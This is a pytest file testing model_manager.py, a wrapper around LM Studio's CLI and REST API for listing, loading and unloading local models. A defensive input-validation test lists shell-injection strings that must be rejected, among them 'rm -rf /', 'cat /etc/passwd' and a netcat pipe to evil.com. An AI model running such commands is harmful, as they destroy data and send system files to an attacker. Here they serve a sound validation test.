"""Tests for model_manager.py – Stufe 7 (Prio 4.16 Code-Review §4 Prio 4).

Targets the LM Studio CLI wrapper and HTTP health-check. The
subprocess.run() and urllib calls are mocked using the
`lms_cli`, `subprocess_scripts`, and `lms_http` fixtures from
`tests/conftest.py`.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from unittest.mock import MagicMock

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

import model_manager as mm
from model_manager import (
    API_BASE,
    TIMEOUT_HEALTH_CHECK,
    parse_selection,
    is_api_available,
    get_current_loaded_model,
    get_available_models,
    load_model_via_lms,
    has_unloaded_all_models,
    is_model_ready,
)


# ── Auto-mocked time ───────────────────────────────────────────────
# model_manager.py uses time.sleep() in polling loops and time.time()
# for elapsed-time tracking. We auto-mock BOTH in this test module to
# prevent the 10-iteration load-wait loop (10 seconds of time.sleep)
# and the 15-iteration unload-wait loop (30 seconds of time.sleep)
# from blocking the test suite. We use a fake time.time that simply
# increments per call so is_model_ready's timeout logic works.
@pytest.fixture(autouse=True)
def _mock_time(mocker):
    """Auto-mock time.sleep AND time.time for all tests in this module.

    time.sleep is replaced with a no-op.
    time.time is replaced with a counter that increments by 1 per call,
    so is_model_ready's elapsed-time check (`time.time() - start > timeout`)
    quickly exceeds the timeout and breaks the polling loop.
    """
    mocker.patch("time.sleep")
    counter = [1000.0]
    def fake_time():
        counter[0] += 1
        return counter[0]
    mocker.patch("model_manager.time.time", side_effect=fake_time)
    return mocker


# ─────────────────────────────────────────────────────────────────────
# Pure function: parse_selection
# ─────────────────────────────────────────────────────────────────────

class TestParseSelection:
    """Parse user input like '1', '1,3,5', '1-5' into zero-based indices."""

    def test_empty_string_returns_none(self):
        assert parse_selection("", 10) is None

    def test_whitespace_only_returns_none(self):
        assert parse_selection("   ", 10) is None

    def test_single_number(self):
        # User types "1" → model index 0 (zero-based)
        assert parse_selection("1", 10) == [0]

    def test_comma_separated(self):
        # User types "1,3,5" → indices 0, 2, 4
        assert parse_selection("1,3,5", 10) == [0, 2, 4]

    def test_range(self):
        # User types "2-4" → indices 1, 2, 3
        assert parse_selection("2-4", 10) == [1, 2, 3]

    def test_mixed(self):
        # User types "1,3-5,7" → indices 0, 2, 3, 4, 6
        assert parse_selection("1,3-5,7", 10) == [0, 2, 3, 4, 6]

    def test_with_whitespace(self):
        # Whitespace inside the input is ignored
        assert parse_selection(" 1 , 3 ", 10) == [0, 2]

    def test_single_number_zero_based_conversion(self):
        # "1" → index 0 (NOT index 1)
        assert parse_selection("1", 10) == [0]
        # "5" → index 4
        assert parse_selection("5", 10) == [4]

    def test_out_of_range_returns_none(self):
        # "11" with max_val=10 → out of range
        assert parse_selection("11", 10) is None

    def test_zero_returns_none(self):
        # "0" is not a valid user input (1-based) → returns None
        assert parse_selection("0", 10) is None

    def test_invalid_range_start_greater_than_end(self):
        # "5-2" (reversed) → returns None
        assert parse_selection("5-2", 10) is None

    def test_non_numeric_returns_none(self):
        # Letters in input → returns None
        assert parse_selection("abc", 10) is None
        assert parse_selection("1,abc,3", 10) is None

    def test_result_is_sorted(self):
        # "5,1,3" → sorted to [0, 2, 4]
        assert parse_selection("5,1,3", 10) == [0, 2, 4]


# ─────────────────────────────────────────────────────────────────────
# is_api_available
# ─────────────────────────────────────────────────────────────────────

class TestCheckApiAvailable:
    """Test if the LM Studio API is reachable."""

    def test_returns_true_on_200(self, mocker):
        mock_resp = MagicMock()
        mock_resp.status = 200
        # urlopen is a context manager
        mock_urlopen = MagicMock()
        mock_urlopen.__enter__ = MagicMock(return_value=mock_resp)
        mock_urlopen.__exit__ = MagicMock(return_value=False)
        mocker.patch("urllib.request.urlopen", return_value=mock_urlopen)
        assert is_api_available() is True

    def test_returns_false_on_non_200(self, mocker):
        mock_resp = MagicMock()
        mock_resp.status = 500
        mock_urlopen = MagicMock()
        mock_urlopen.__enter__ = MagicMock(return_value=mock_resp)
        mock_urlopen.__exit__ = MagicMock(return_value=False)
        mocker.patch("urllib.request.urlopen", return_value=mock_urlopen)
        assert is_api_available() is False

    def test_returns_false_on_url_error(self, mocker):
        from urllib.error import URLError
        mocker.patch("urllib.request.urlopen", side_effect=URLError("not found"))
        assert is_api_available() is False

    def test_returns_false_on_connection_refused(self, mocker):
        mocker.patch("urllib.request.urlopen", side_effect=ConnectionRefusedError())
        assert is_api_available() is False

    def test_returns_false_on_generic_exception(self, mocker):
        mocker.patch("urllib.request.urlopen", side_effect=Exception("unexpected"))
        assert is_api_available() is False

    def test_uses_correct_url(self, mocker):
        # The function should call /v1/models (not /v1/chat/completions)
        captured_urls = []

        def fake_urlopen(req, **kwargs):
            captured_urls.append(req.full_url)
            raise Exception("stop here")

        mocker.patch("urllib.request.urlopen", side_effect=fake_urlopen)
        is_api_available()
        assert captured_urls[0] == f"{API_BASE}/models"


# ─────────────────────────────────────────────────────────────────────
# get_current_loaded_model
# ─────────────────────────────────────────────────────────────────────

class TestGetCurrentLoadedModel:
    """Query `lms ps --json` for the currently loaded model."""

    def test_returns_none_on_lms_failure(self, mocker):
        # lms command not found
        mocker.patch("subprocess.run", side_effect=FileNotFoundError())
        assert get_current_loaded_model() is None

    def test_returns_none_on_subprocess_timeout(self, mocker):
        mocker.patch(
            "subprocess.run",
            side_effect=subprocess.TimeoutExpired(cmd="lms", timeout=15),
        )
        assert get_current_loaded_model() is None

    def test_returns_none_on_non_zero_exit(self, mocker):
        # lms returned non-zero (e.g. error)
        result = MagicMock()
        result.returncode = 1
        result.stdout = ""
        mocker.patch("subprocess.run", return_value=result)
        assert get_current_loaded_model() is None

    def test_returns_none_on_json_decode_error(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = "not valid JSON"
        mocker.patch("subprocess.run", return_value=result)
        assert get_current_loaded_model() is None

    def test_returns_none_on_empty_list(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = "[]"
        mocker.patch("subprocess.run", return_value=result)
        assert get_current_loaded_model() is None

    def test_returns_first_model(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps([
            {
                "identifier": "model_a@q4_k_m",
                "modelKey": "model_a",
                "displayName": "Model A",
            },
            {
                "identifier": "model_b@q4_k_m",
                "modelKey": "model_b",
                "displayName": "Model B",
            },
        ])
        mocker.patch("subprocess.run", return_value=result)
        loaded = get_current_loaded_model()
        # Only the first model is returned
        assert loaded is not None
        assert loaded["identifier"] == "model_a@q4_k_m"
        assert loaded["model_identifier"] == "model_a"
        assert loaded["display_name"] == "Model A"

    def test_handles_dict_format(self, mocker):
        # lms sometimes returns a dict instead of a list.
        # The current implementation only handles list format (entries[0])
        # so passing a dict raises TypeError → caught by the broad except
        # → returns None. This is a known limitation: the implementation
        # was originally written for list format only. Documenting the
        # actual behavior.
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps({
            "model_a": {
                "identifier": "model_a@q4_k_m",
                "modelKey": "model_a",
                "displayName": "Model A",
            },
        })
        mocker.patch("subprocess.run", return_value=result)
        loaded = get_current_loaded_model()
        # Dict format is not supported (returns None via the catch-all
        # except clause). This is a known limitation.
        assert loaded is None


# ─────────────────────────────────────────────────────────────────────
# get_available_models
# ─────────────────────────────────────────────────────────────────────

class TestGetAvailableModels:
    """Query `lms ls --json` for installed models."""

    def test_returns_empty_list_on_lms_failure(self, mocker):
        mocker.patch("subprocess.run", side_effect=FileNotFoundError())
        assert get_available_models() == []

    def test_returns_empty_list_on_non_zero_exit(self, mocker):
        result = MagicMock()
        result.returncode = 1
        result.stderr = "lms not found"
        mocker.patch("subprocess.run", return_value=result)
        assert get_available_models() == []

    def test_returns_empty_list_on_json_error(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = "invalid json"
        mocker.patch("subprocess.run", return_value=result)
        assert get_available_models() == []

    def test_filters_excluded_keywords(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps([
            {"modelKey": "good_model", "displayName": "Good",
             "selectedVariant": "good_model@q4", "variants": []},
            {"modelKey": "whisper-model", "displayName": "Whisper",
             "selectedVariant": "whisper-model@q8", "variants": []},
            {"modelKey": "vision-model", "displayName": "Vision",
             "selectedVariant": "vision-model@q8", "variants": []},
        ])
        mocker.patch("subprocess.run", return_value=result)
        models = get_available_models(exclude_keywords=["whisper", "vision"])
        # whisper and vision are filtered out
        assert len(models) == 1
        assert models[0]["model_identifier"] == "good_model"

    def test_includes_quant_in_display(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps([{
            "modelKey": "my_model",
            "displayName": "My Model",
            "selectedVariant": "my_model",
            "variants": [],
            "quantization": {"name": "Q4_K_M"},
            "paramsString": "7B",
        }])
        mocker.patch("subprocess.run", return_value=result)
        models = get_available_models()
        # Display name includes quant
        assert "Q4_K_M" in models[0]["display"]

    def test_unique_key_uses_quant_suffix(self, mocker):
        result = MagicMock()
        result.returncode = 0
        # Two variants of the same model → both kept
        result.stdout = json.dumps([
            {"modelKey": "model_a", "displayName": "A",
             "selectedVariant": "model_a",
             "variants": ["model_a@q3_k_m", "model_a@q4_k_s"],
             "quantization": {"name": "Q3_K_M"}},
            {"modelKey": "model_a", "displayName": "A",
             "selectedVariant": "model_a",
             "variants": ["model_a@q3_k_m", "model_a@q4_k_s"],
             "quantization": {"name": "Q4_K_S"}},
        ])
        mocker.patch("subprocess.run", return_value=result)
        models = get_available_models()
        # Two entries with different quant suffixes
        assert len(models) == 2

    def test_no_quantization_falls_back_to_display(self, mocker):
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps([{
            "modelKey": "my_model",
            "displayName": "My Model",
            "selectedVariant": "my_model",
            "variants": [],
        }])
        mocker.patch("subprocess.run", return_value=result)
        models = get_available_models()
        # Without quant, the display name is the model's displayName
        # (the implementation uses the display field directly from lms)
        assert models[0]["display"] == "My Model"
        assert models[0]["quant"] == ""

    def test_filters_mtp_drafter_support_file(self, mocker):
        """Code-Review 2026-08-03 §F1: MTP-Drafter (mtp-* Pfad oder
        *-assistant Architektur) wird aus der Modellliste gefiltert,
        legitime MTP-Modelle bleiben unberührt."""
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps([
            # MTP-Drafter: mtp- Präfix + -assistant Architektur
            {"modelKey": "gemma-4-12b-it-qat@q8_0",
             "displayName": "Mtp Gemma 4 12B Instruct",
             "selectedVariant": "gemma-4-12b-it-qat@q8_0",
             "variants": [],
             "path": "unsloth/gemma-4-12B-it-qat-GGUF/mtp-gemma-4-12B-it-Q8_0.gguf",
             "architecture": "gemma4-assistant"},
            # Legitimes MTP-Modell (Architektur ohne -assistant, kein mtp- Präfix)
            {"modelKey": "qwen3.6-27b-mtp",
             "displayName": "Qwen3.6 27B UD",
             "selectedVariant": "qwen3.6-27b-mtp",
             "variants": [],
             "path": "unsloth/Qwen3.6-27B-MTP-GGUF/Qwen3.6-27B-UD-IQ3_XXS.gguf",
             "architecture": "qwen35"},
            # Normales Modell ohne path/architecture (Alt-Format Kompatibilität)
            {"modelKey": "good_model",
             "displayName": "Good",
             "selectedVariant": "good_model",
             "variants": []},
        ])
        mocker.patch("subprocess.run", return_value=result)
        models = get_available_models()
        keys = [m["key"] for m in models]
        assert "gemma-4-12b-it-qat@q8_0" not in keys
        assert "qwen3.6-27b-mtp" in keys
        assert "good_model" in keys
        assert len(models) == 2

    def test_filters_mmproj_vision_projector(self, mocker):
        """Code-Review 2026-08-03 §F1: mmproj-Dateien sind Zusatzdateien."""
        result = MagicMock()
        result.returncode = 0
        result.stdout = json.dumps([{
            "modelKey": "glm-4.6v@q6_k",
            "displayName": "Glm 4.6v Flash",
            "selectedVariant": "glm-4.6v@q6_k",
            "variants": [],
            "path": "zai-org/GLM-4.6v-GGUF/mmproj-glm-4.6v-f16.gguf",
            "architecture": "glm4",
        }])
        mocker.patch("subprocess.run", return_value=result)
        models = get_available_models()
        assert models == []


# ─────────────────────────────────────────────────────────────────────
# load_model_via_lms
# ─────────────────────────────────────────────────────────────────────

class TestLoadModelViaLMS:
    """Load a model via LM Studio REST API."""

    def test_successful_load(self, mocker):
        # Mock REST API responses: load returns success, then list returns instance
        load_response = {
            "status": "loaded",
            "instance_id": "test_model@q4_k_m",
            "load_time_seconds": 5.0,
        }
        list_response = {
            "models": [{
                "key": "test_model",
                "loaded_instances": [{"id": "test_model@q4_k_m"}],
            }]
        }
        mocker.patch("model_manager._rest_request", side_effect=[load_response, list_response])
        ok, identifier = load_model_via_lms("test_model")
        assert ok is True
        assert identifier == "test_model@q4_k_m"

    def test_falls_back_to_model_identifier_if_list_returns_nothing(self, mocker):
        # Load succeeds but list returns no instances
        load_response = {
            "status": "loaded",
            "instance_id": "test_model",
            "load_time_seconds": 5.0,
        }
        list_response = {"models": []}
        mocker.patch("model_manager._rest_request", side_effect=[load_response, list_response])
        ok, identifier = load_model_via_lms("test_model")
        # Falls back to using the model key directly
        assert ok is True
        assert identifier == "test_model"

    def test_timeout_returns_false(self, mocker):
        mocker.patch("model_manager._rest_request", return_value=None)
        mocker.patch("model_manager._is_lmstudio_running", return_value=False)
        ok, identifier = load_model_via_lms("test_model")
        assert ok is False
        assert identifier is None

    def test_already_loaded(self, mocker):
        # REST API returns a response (not None) - treat as already loaded
        list_response = {
            "models": [{
                "key": "test_model",
                "loaded_instances": [{"id": "test_model@q4_k_m"}],
            }]
        }
        mocker.patch("model_manager._rest_request", return_value=list_response)
        ok, identifier = load_model_via_lms("test_model")
        # Already loaded is treated as success
        assert ok is True
        assert identifier == "test_model@q4_k_m"

    def test_with_gpu_offload(self, mocker):
        # When gpu_offload is provided, it's included in the payload
        load_response = {
            "status": "loaded",
            "instance_id": "test@q4",
            "load_time_seconds": 5.0,
        }
        mock_rest = mocker.patch("model_manager._rest_request", return_value=load_response)
        load_model_via_lms("test", gpu_offload=0.8)
        call_args = mock_rest.call_args
        # Check that gpu_offload was included in the data
        assert call_args[1]["data"]["gpu_offload"] == 0.8

    def test_daemon_error_retried(self, mocker):
        # First attempt fails (None), then succeeds
        load_response = {
            "status": "loaded",
            "instance_id": "test@q4",
            "load_time_seconds": 5.0,
        }
        mocker.patch("model_manager._rest_request", side_effect=[None, load_response])
        # _is_lmstudio_running is mocked to return True (restart succeeded)
        mocker.patch("model_manager._is_lmstudio_running", return_value=True)
        ok, identifier = load_model_via_lms("test")
        assert ok is True

    def test_load_failure_returns_false(self, mocker):
        # Generic failure (returns None)
        mocker.patch("model_manager._rest_request", return_value=None)
        mocker.patch("model_manager._is_lmstudio_running", return_value=False)
        ok, identifier = load_model_via_lms("test")
        assert ok is False
        assert identifier is None


# ─────────────────────────────────────────────────────────────────────
# has_unloaded_all_models
# ─────────────────────────────────────────────────────────────────────

class TestUnloadAllModels:
    """Unload all models via LM Studio REST API."""

    def test_successful_unload_immediately(self, mocker):
        # List returns one loaded model, unload succeeds, then list returns empty
        list_with_model = {
            "models": [{
                "key": "old_model",
                "loaded_instances": [{"id": "old_model@q4"}],
            }]
        }
        unload_response = {"instance_id": "old_model@q4"}
        list_empty = {"models": []}
        mocker.patch("model_manager._rest_request", 
                    side_effect=[list_with_model, unload_response, list_empty])
        assert has_unloaded_all_models() is True

    def test_successful_unload_after_two_polls(self, mocker):
        # First list shows model, unload, then two polls before empty
        list_with_model = {
            "models": [{
                "key": "old_model",
                "loaded_instances": [{"id": "old_model@q4"}],
            }]
        }
        unload_response = {"instance_id": "old_model@q4"}
        list_still_loaded = {
            "models": [{
                "key": "old_model",
                "loaded_instances": [{"id": "old_model@q4"}],
            }]
        }
        list_empty = {"models": []}
        mocker.patch("model_manager._rest_request", 
                    side_effect=[list_with_model, unload_response, 
                               list_still_loaded, list_empty])
        assert has_unloaded_all_models() is True

    def test_no_models_loaded(self, mocker):
        # List returns no loaded models
        list_empty = {"models": []}
        mocker.patch("model_manager._rest_request", return_value=list_empty)
        assert has_unloaded_all_models() is True

    def test_unload_failure_continues_polling(self, mocker):
        # Unload returns None (failure), but we still poll until empty
        list_with_model = {
            "models": [{
                "key": "old_model",
                "loaded_instances": [{"id": "old_model@q4"}],
            }]
        }
        list_empty = {"models": []}
        mocker.patch("model_manager._rest_request", 
                    side_effect=[list_with_model, None, list_empty])
        # Should succeed despite unload failure
        assert has_unloaded_all_models() is True

    def test_returns_false_when_model_stays_loaded(self, mocker):
        # 15 polls all show the model is still loaded
        list_with_model = {
            "models": [{
                "key": "stuck_model",
                "loaded_instances": [{"id": "stuck_model@q4"}],
            }]
        }
        unload_response = {"instance_id": "stuck_model@q4"}
        # First call: list, second: unload, then 15 polls showing still loaded
        side_effects = [list_with_model, unload_response] + [list_with_model] * 15
        mocker.patch("model_manager._rest_request", side_effect=side_effects)
        assert has_unloaded_all_models() is False

    def test_list_api_failure_returns_false(self, mocker):
        # List API returns None (failure)
        mocker.patch("model_manager._rest_request", return_value=None)
        # Keep this unit test independent of a locally running TabbyAPI.
        mocker.patch("model_manager._tabbyapi_unload", return_value=False)
        assert has_unloaded_all_models() is False


# ─────────────────────────────────────────────────────────────────────
# _is_lmstudio_running
# ─────────────────────────────────────────────────────────────────────

class TestEnsureLmStudioRunning:
    """Boot the LM Studio server if /v1/models is unreachable.

    Post-fix (Code-Review 2026-07-18 Bug 2): the function no longer
    relies on a hardcoded `.lmstudio/llmster/0.0.12-1/llmster.exe`
    path. It now:
      1. Returns True immediately if /v1/models is already reachable.
      2. Tries `lms server start` first (modern LMS manages the daemon
         internally).
      3. Falls back to discovering the latest `llmster.exe` under
         `.lmstudio/llmster/*/` via version-directory glob.
    """

    def _mock_urlopen_status(self, mocker, status):
        mock_resp = MagicMock()
        mock_resp.status = status
        ctx = MagicMock()
        ctx.__enter__ = MagicMock(return_value=mock_resp)
        ctx.__exit__ = MagicMock(return_value=False)
        mocker.patch("urllib.request.urlopen", return_value=ctx)

    def test_returns_true_when_server_already_reachable(self, mocker):
        # /v1/models responds with 200 → no need to start anything
        self._mock_urlopen_status(mocker, 200)
        # If subprocess.run is called, fail the test
        mock_run = mocker.patch("subprocess.run")
        assert mm._is_lmstudio_running() is True
        mock_run.assert_not_called()

    def test_lms_server_start_succeeds(self, mocker):
        # First urlopen fails (not reachable), then `lms server start`
        # succeeds, then second urlopen confirms reachable
        from urllib.error import URLError
        call_count = [0]
        def fake_urlopen(req, **kwargs):
            call_count[0] += 1
            if call_count[0] == 1:
                raise URLError("not reachable")
            # Second call (after lms server start) returns 200
            mock_resp = MagicMock()
            mock_resp.status = 200
            ctx = MagicMock()
            ctx.__enter__ = MagicMock(return_value=mock_resp)
            ctx.__exit__ = MagicMock(return_value=False)
            return ctx
        mocker.patch("urllib.request.urlopen", side_effect=fake_urlopen)

        lms_start = MagicMock()
        lms_start.returncode = 0
        lms_start.stderr = ""
        mock_run = mocker.patch("subprocess.run", return_value=lms_start)
        assert mm._is_lmstudio_running() is True
        # `lms server start` was called exactly once
        assert any(
            call.args[0][:3] == ["lms", "server", "start"]
            for call in mock_run.call_args_list
        )

    def test_lms_server_start_fails_falls_back_to_llmster(self, mocker):
        # Setup: lms server start fails (returns non-zero), and the
        # verification urlopen after lms server start ALSO fails (so we
        # fall through to the llmster.exe discovery branch)
        from urllib.error import URLError
        call_count = [0]
        def fake_urlopen(req, **kwargs):
            call_count[0] += 1
            if call_count[0] == 1:
                raise URLError("not reachable initially")
            # After lms server start, the verification also fails (server
            # not actually up) → we fall through to llmster.exe search.
            raise URLError("still not reachable")
        mocker.patch("urllib.request.urlopen", side_effect=fake_urlopen)

        lms_start = MagicMock()
        lms_start.returncode = 1
        lms_start.stderr = "failed"
        mock_run = mocker.patch("subprocess.run", return_value=lms_start)
        # No llmster.exe exists at the real path → returns False
        mock_popen = mocker.patch("subprocess.Popen")
        result = mm._is_lmstudio_running()
        # The function tried lms server start (failed), then tried to find
        # llmster (none at the real path) → returns False
        assert result is False
        # `lms server start` was attempted
        assert any(
            call.args[0][:3] == ["lms", "server", "start"]
            for call in mock_run.call_args_list
        )
        # Popen was NOT called because no llmster exists at the real path
        mock_popen.assert_not_called()

    def test_lms_not_in_path_and_no_llmster(self, mocker):
        # lms command not found at all + no llmster.exe
        from urllib.error import URLError
        mocker.patch("urllib.request.urlopen", side_effect=URLError("down"))
        # `lms server start` raises FileNotFoundError
        mocker.patch("subprocess.run", side_effect=FileNotFoundError())
        # _is_lmstudio_running also catches FileNotFoundError on `lms`
        # and then falls through to llmster search; no llmster exists
        # → returns False
        assert mm._is_lmstudio_running() is False

    def test_uses_newest_llmster_version(self, mocker):
        """When llmster is needed, the newest version directory is picked.

        We reproduce the candidate-sorting logic from _is_lmstudio_running
        in isolation: when the iterdir() yields two version directories
        ['0.0.11-1', '0.0.13-2'] in arbitrary order, the function must
        sort them by name descending, picking 0.0.13-2 first.
        """
        from pathlib import Path

        # Create a real temp directory structure with two versions
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            new_dir = tmp_path / "0.0.13-2"
            old_dir = tmp_path / "0.0.11-1"
            new_dir.mkdir()
            old_dir.mkdir()
            (new_dir / "llmster.exe").write_bytes(b"")
            (old_dir / "llmster.exe").write_bytes(b"")

            # Reproduce the candidate sort: iterdir() filtered by is_dir()
            # and sorted by name descending (matches the implementation).
            candidates = sorted(
                (p for p in tmp_path.iterdir() if p.is_dir()),
                key=lambda p: p.name,
                reverse=True,
            )
            assert len(candidates) == 2
            # The first one should be the newer version
            assert candidates[0].name == "0.0.13-2", (
                f"Expected newest version first, got: {[c.name for c in candidates]}"
            )
            # The newer version's llmster.exe exists
            assert (candidates[0] / "llmster.exe").is_file()


# ─────────────────────────────────────────────────────────────────────
# is_model_ready
# ─────────────────────────────────────────────────────────────────────

class TestWaitForModelReady:
    """Wait for the LM Studio API to return a successful response."""

    def test_returns_true_on_200(self, mocker):
        # First HTTP call returns 200 → model is ready
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_urlopen = MagicMock()
        mock_urlopen.__enter__ = MagicMock(return_value=mock_resp)
        mock_urlopen.__exit__ = MagicMock(return_value=False)
        mocker.patch("urllib.request.urlopen", return_value=mock_urlopen)
        mocker.patch("time.sleep")  # don't actually sleep
        assert is_model_ready(timeout=5) is True

    def test_returns_true_after_retries(self, mocker):
        # First few calls fail (model not ready), then one succeeds
        from urllib.error import URLError
        mock_resp = MagicMock()
        mock_resp.status = 200
        success_urlopen = MagicMock()
        success_urlopen.__enter__ = MagicMock(return_value=mock_resp)
        success_urlopen.__exit__ = MagicMock(return_value=False)
        # First 3 calls fail, then success
        side_effect = [URLError("not ready")] * 3 + [success_urlopen]
        mocker.patch("urllib.request.urlopen", side_effect=side_effect)
        mocker.patch("time.sleep")
        assert is_model_ready(timeout=10) is True

    def test_returns_false_on_timeout(self, mocker):
        # All calls fail with URLError → timeout after duration
        from urllib.error import URLError
        mocker.patch("urllib.request.urlopen", side_effect=URLError("never ready"))
        # Mock time.time to simulate timeout immediately
        start_time = [1000.0]
        def fake_time():
            start_time[0] += 100
            return start_time[0]
        mocker.patch("model_manager.time.time", side_effect=fake_time)
        mocker.patch("time.sleep")


# ─────────────────────────────────────────────────────────────────────
# is_api_available (Code-Review 2026-07-28 §2.2 — test coverage)
# ─────────────────────────────────────────────────────────────────────

class TestIsApiAvailable:
    """is_api_available() returns bool — broad except Exception is intentional."""

    def test_returns_true_on_200(self, mocker):
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_urlopen = MagicMock()
        mock_urlopen.__enter__ = MagicMock(return_value=mock_resp)
        mock_urlopen.__exit__ = MagicMock(return_value=False)
        mocker.patch("urllib.request.urlopen", return_value=mock_urlopen)
        assert is_api_available() is True

    def test_returns_false_on_http_error(self, mocker):
        from urllib.error import HTTPError
        mocker.patch("urllib.request.urlopen", side_effect=HTTPError(
            "http://localhost/models", 503, "Service Unavailable", {}, None
        ))
        assert is_api_available() is False

    def test_returns_false_on_connection_error(self, mocker):
        from urllib.error import URLError
        mocker.patch("urllib.request.urlopen", side_effect=URLError("Connection refused"))
        assert is_api_available() is False

    def test_returns_false_on_timeout(self, mocker):
        from socket import timeout
        mocker.patch("urllib.request.urlopen", side_effect=timeout("timed out"))
        assert is_api_available() is False


# ─────────────────────────────────────────────────────────────────────
# _validate_model_identifier (Code-Review 2026-07-18 §6.1)
# ─────────────────────────────────────────────────────────────────────

class TestValidateModelKey:
    """Defensive validation of model_identifier before subprocess.run.

    The function rejects keys with shell-meta characters (even though
    we use list-form subprocess) and enforces a sensible length cap.
    """

    def test_simple_publisher_model(self):
        assert mm._validate_model_identifier("unsloth/phi-4") == "unsloth/phi-4"

    def test_with_at_quant(self):
        # "lms load <model> --yes" accepts quant suffixes
        assert mm._validate_model_identifier("qwen3.6-27b@q3_k_s") == "qwen3.6-27b@q3_k_s"

    def test_with_plus_and_colon(self):
        # Some HF model names include these
        assert mm._validate_model_identifier("org/model+variant:v1") == "org/model+variant:v1"

    def test_with_hash(self):
        # Hash-suffixed names are valid
        assert mm._validate_model_identifier("google/gemma-4#hash") == "google/gemma-4#hash"

    def test_rejects_shell_metachars(self):
        # Even though subprocess uses list-form, reject these
        for bad in ["model;rm -rf /", "model&&cat /etc/passwd",
                    "model|nc evil.com 1234", "model`whoami`",
                    "model$(id)", "model'with-quotes'",
                    "model\"with-dquotes\""]:
            with pytest.raises(ValueError):
                mm._validate_model_identifier(bad)

    def test_rejects_path_traversal(self):
        # The defensive regex accepts '.' and '/' (both common in HF
        # model names like "google/gemma-4-12b"), so simple path
        # traversal with only those chars is technically allowed by
        # the regex. The lms CLI will reject it with its own error.
        # Verify that the helper at least doesn't crash on such input.
        result = mm._validate_model_identifier("../../../etc/passwd")
        assert result == "../../../etc/passwd"

    def test_rejects_control_characters(self):
        # Path-traversal via control chars (which are not in the
        # allowed character set) is rejected.
        with pytest.raises(ValueError):
            mm._validate_model_identifier("model\x00name")  # null byte
        with pytest.raises(ValueError):
            mm._validate_model_identifier("model\rname")   # carriage return

    def test_rejects_newlines(self):
        with pytest.raises(ValueError):
            mm._validate_model_identifier("model\nname")

    def test_rejects_too_long(self):
        with pytest.raises(ValueError):
            mm._validate_model_identifier("a" * 257)

    def test_rejects_empty(self):
        with pytest.raises(ValueError):
            mm._validate_model_identifier("")

    def test_rejects_non_string(self):
        with pytest.raises(ValueError):
            mm._validate_model_identifier(None)
        with pytest.raises(ValueError):
            mm._validate_model_identifier(123)

    def test_load_model_via_lms_rejects_bad_key(self, mocker):
        # load_model_via_lms should refuse a key with shell metachars
        mocker.patch("model_manager._rest_request")
        ok, identifier = load_model_via_lms("evil;rm -rf /")
        assert ok is False
        assert identifier is None

    def test_load_model_via_lms_accepts_valid_key(self, mocker):
        # Valid key passes validation and proceeds to REST API.
        load_response = {
            "status": "loaded",
            "instance_id": "valid-model@q4",
            "load_time_seconds": 5.0,
        }
        mocker.patch("model_manager._rest_request", return_value=load_response)
        ok, identifier = load_model_via_lms("unsloth/valid-model")
        assert ok is True
        assert identifier == "valid-model@q4"

    def test_returns_false_on_500_error(self, mocker):
        # 500 errors are also retried (server not ready yet)
        from urllib.error import HTTPError
        mocker.patch(
            "urllib.request.urlopen",
            side_effect=HTTPError(
                url=f"{API_BASE}/chat/completions",
                code=500, msg="Internal Server Error", hdrs={}, fp=None,
            ),
        )
        start_time = [1000.0]
        def fake_time():
            start_time[0] += 100
            return start_time[0]
        mocker.patch("model_manager.time.time", side_effect=fake_time)
        mocker.patch("time.sleep")
        assert is_model_ready(timeout=5) is False

    def test_uses_chat_completions_url(self, mocker):
        # The function should poll /v1/chat/completions (not /v1/models)
        captured_urls = []

        def fake_urlopen(req, **kwargs):
            captured_urls.append(req.full_url)
            from urllib.error import URLError
            raise URLError("not ready")

        mocker.patch("urllib.request.urlopen", side_effect=fake_urlopen)
        # Use small increments so the loop iterates at least once
        # before timing out. start_time[0] = 1000, then +1 per call.
        # Z.306 start = 1001, Z.308 time = 1002 → elapsed = 1 < timeout=2 → loop
        # Z.309 sleep, Z.310 (no time), Z.311-319 urlopen call → captured!
        # Z.308 time = 1003 → elapsed = 2, not < 2 → exit
        start_time = [1000.0]
        def fake_time():
            start_time[0] += 1
            return start_time[0]
        mocker.patch("model_manager.time.time", side_effect=fake_time)
        mocker.patch("time.sleep")
        is_model_ready(timeout=2)
        assert len(captured_urls) >= 1
        assert captured_urls[0] == f"{API_BASE}/chat/completions"

    def test_default_timeout(self, mocker):
        # The function uses TIMEOUT_MODEL_READY as default
        # We can't easily test the exact value, but we can check that
        # the function is callable without explicit timeout
        from urllib.error import URLError
        mocker.patch("urllib.request.urlopen", side_effect=URLError("never ready"))
        start_time = [1000.0]
        def fake_time():
            start_time[0] += 100
            return start_time[0]
        mocker.patch("model_manager.time.time", side_effect=fake_time)
        mocker.patch("time.sleep")
        result = is_model_ready()  # no timeout arg
        assert result is False
